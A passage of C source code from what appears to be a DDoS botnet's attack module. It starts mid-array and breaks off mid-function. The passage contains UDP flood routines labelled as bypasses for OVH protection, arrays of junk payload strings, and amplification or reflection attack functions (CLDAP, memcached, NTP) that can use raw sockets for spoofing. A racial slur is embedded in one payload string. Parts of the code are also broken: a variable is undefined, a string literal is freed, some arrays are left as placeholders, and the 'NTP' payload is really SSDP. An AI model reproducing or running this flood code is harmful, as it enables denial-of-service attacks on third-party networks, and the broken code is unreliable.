        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x6D\x21\x65\x66\x67\x60\x60\x6C\x21\x65\x66\x60\x35\x2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\x6C\x65\x60\x30\x60\x2C\x65\x64\x54",
        "RyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGangRyMGang",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
        "yfj82z4ou6nd3pig3borbrrqhcve6n56xyjzq68o7yd1axh4r0gtpgyy9fj36nc2w",
        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb",
        "01010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101",
        "7tyv7w4bvy8t73y45t09uctyyz2qa3wxs4ce5rv6tb7yn8umi9,minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf",
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdedsecrunsyoulilassniggaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    };

    unsigned int a = 0;
    while (1) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))]; // select a random string
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));

            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0); // exit after the specified time
            }
            a = 0;
        }
        a++;
    }
}
/**
 * sends specific packets for bypassing OVH protection
 *
 * @param ip target IP address as a string
 * @param port target port number
 * @param secs duration to send packets in seconds
 */
void sendOvhBypassOne(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = { /* Include the array of strings here */ };

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
void sendOvhBypassTwo(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = {"/x6f/x58/x22/x2e/x04/x92/x04/xa4/x42/x94/xb4/xf4/x44/xf4/x94/xd2/x04/xb4/xc4/xd2/x05/x84/xb4/xa4/xa6/xb3/x24/xd4/xb4/xf4/xa5/x74/xf4/x42/x04/x94/xf2/x24/xf5/x02/x03/xc4/x45/x04/xf5/x14/x44/x23",
        "\x78\x6d\x69\x77\x64\x69\x6f\x20\x4d\x4f\x51\x57\x49\x22\x4b\x20\x28\x2a\x2a\x28\x44\x38\x75\x39\x32\x38\x39\x64\x32\x38\x39\x32\x65\x39\x20\x4e\x49\x4f\x57\x4a\x44\x69\x6f\x6a\x77\x69\x6f\x57\x41\x4a\x4d\x20\x44\x4b\x4c\x41\x4d\x29\x20",
        "/x48/x39/x32/x29/x53/x54/x49/x6c/x65/x20/x29/x5f/x51/x20/x49/x53/x4e/x22/x20/x4b/x58/x4d/x3c/x20/x4f/x53/x51/x22/x4f/x50/x20/x50/x41/x43/x4b/x45/x54/x20/xc2/xa3/x52/x4f/x4d/x57/x44/x4b/x4c/x57",
        };

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
void sendOvhBypassThree(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = {"/73x/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x49/x4f/x57/x20/x57/x4f/x4b/x3c/x20/x57/x44/x4b/x20/x44/x29/x5f/x41/",
        "/20x/x58/x4b/x49/x57/x44/x49/x4a/x22/x20/x22/x64/x39/x63/x39/x29/x4d/x20/x29/x57/x5f/x22/x21/x5f/x2b/x20/x51/x53/x4d/x45/x4d/x44/x4d/x20/x29/x28/x28/x22/x29/x45/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/",
        "/43x/x4f/x44/x57/x20/x49/x20/x22/x5f/x29/x20/x58/x43/x4b/x4d/x20/x53/x4c/x52/x4f/x4d/x20/x43/x50/x4c/x3a/x50/x51/x20/x71/x5b/x7a/x71/x3b/x38/x38/x20/x43/x57/x29/x57/x22/x29/x64/x32/x20/x4b/x58/x4b/x4b/x4c/x22/x44/x20/x2d/x44/x5f/",
        };

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
/**
 * sends specific UDP packets to a target IP for a duration
 *
 * @param ip target IP address as a string
 * @param port target port number
 * @param secs duration to send packets in seconds
 */
void sendZgo(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = {/* array of strings here */};

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
void sendZDP(unsigned char *ip, int port, int secs) {
    int std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) return; // check if socket creation was successful

    time_t start = time(NULL);
    struct sockaddr_in sin;

    struct hostent *hp = gethostbyname((char *)ip);
    if (hp == NULL) return; // check if hostname resolution was successful

    memset(&sin, 0, sizeof(sin));
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    unsigned char *hexstring = malloc(1024);
    if (hexstring == NULL) {
        close(std_hex);
        return; // check for malloc failure
    }
    memset(hexstring, 0, 1024);

    char *randstrings[] = {/* array of strings here */};

    for (unsigned int a = 0; ; a++) {
        if (a >= 50) {
            hexstring = (unsigned char *)randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0); // std_packets needs to be defined or passed
            connect(std_hex, (struct sockaddr *)&sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(std_hex);
                free(hexstring);
                _exit(0);
            }
            a = 0;
        }
    }
}
/**
 * decodes a string using a custom encoding scheme
 *
 * @param str string to decode
 * @return decoded string
 */
char *decode(char *str) {
    int x = 0, i = 0, c;

    memset(decoded, 0, sizeof(decoded));
    while (x < strlen(str)) {
        for (c = 0; c < sizeof(encodes); c++) {
            if (str[x] == encodes[c]) {
                decoded[i] = decodes[c];
                i++;
                break; // break the loop once a match is found
            }
        }
        x++;
    }
    decoded[i] = '\0';

    return decoded;
}
/**
 * Constructs a CLDAP packet
 *
 * @param iph Pointer to the IP header structure
 * @param dest Destination IP address
 * @param source Source IP address
 * @param protocol IP protocol
 * @param packetSize Size of the payload
 */
void makecldappacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    // CLDAP Payload
    char *cldap_payload = "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00";
    int cldap_payload_len = 49; // Length of the CLDAP payload

    // Constructing the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + cldap_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * Performs a CLDAP attack on a target IP address.
 *
 * @param target Target IP address as a string.
 * @param port Target port number.
 * @param timeEnd Duration to send packets in seconds.
 * @param spoofit IP spoofing level.
 * @param packetsize Size of each packet.
 * @param pollinterval Interval to change the port.
 * @param sleepcheck Interval to sleep.
 * @param sleeptime Sleep time in milliseconds.
 */
void cldapattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    int sockfd;
    if (spoofit == 32) {
        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    } else {
        sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    }
    if (sockfd < 0) {
        return; // check if socket creation was successful
    }

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = (port == 0) ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return; // check if hostname resolution was successful
    memset(dest_addr.sin_zero, '\0', sizeof(dest_addr.sin_zero));

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return; // check for malloc failure
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0; ; ) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (i++ == pollinterval) {
            dest_addr.sin_port = (port == 0) ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break; // exit loop after the specified duration
            i = 0;
        }
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000); // sleep for specified time
            ii = 0;
        }
    }
    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with a memcached payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makemempacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    char *mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a";
    int mem_payload_len = 15; // length of the memcached payload

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + mem_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs a memcached attack on a target ip address
 *
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void memattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    char *mem_payload;
    int mem_payload_len;
    mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a";
    mem_payload_len = 15; // length of mem payload

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return; // hostname resolution check
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd;
    if (spoofit == 32) {
        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    } else {
        sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
            close(sockfd);
            return;
        }
    }
    if (!sockfd) {
        return; // socket creation check
    }

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return; // memory allocation check
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0; ; ) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break; // timing check
            i = 0;
        }
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000); // sleep for sleeptime
            ii = 0;
        }
    }
    free(buf);
    close(sockfd);
}

/**
 * constructs a packet with an ntp payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makentppacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    char *ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x53\x54\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a";
    int ntp_payload_len = 97; // length of the ntp payload

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + ntp_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs an ntp attack on a target ip address
 *
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void ntpattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    char *ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x53\x54\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a";
    int ntp_payload_len = 97;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = (spoofit == 32) ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (i++ == pollinterval) {
            if (port == 0) dest_addr.sin_port = rand_cmwc();
            if (time(NULL) > end) break;
            i = 0;
        }
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with a rip payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makerippacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
